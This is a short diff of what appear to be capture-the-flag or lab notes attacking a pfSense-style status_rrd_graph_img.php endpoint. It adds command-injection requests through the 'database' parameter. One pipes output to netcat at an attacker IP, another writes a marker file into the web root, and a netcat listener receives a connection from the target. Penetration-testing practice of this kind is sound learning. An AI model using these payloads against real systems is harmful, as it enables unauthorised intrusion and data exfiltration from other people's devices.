@@ -2,6 +2,8 @@
 https://10.129.73.176/status_rrd_graph_img.php?start=1621149559&graph=eight_hour&database=system-processor.rrd&style=inverse&tmp=10
 
 
+GET /status_rrd_graph_img.php?database=queues;pwd|nc+10.10.14.42+1234 HTTP/1.1
+
 
 
 hippoeug@kali:~$ nc -lnvp 1234
@@ -11,9 +13,4 @@ connect to [10.10.14.42] from (UNKNOWN) [10.129.73.176] 5374
 hippoeug@kali:~$ 
 
 
-
-
-
-
-ET /status_rrd_graph_img.php?database=queues;echo+"CMD+INJECT">cmd.txt HTTP/1.1
-
+GET /status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+"CMD+INJECT">cmd.txt HTTP/1.1
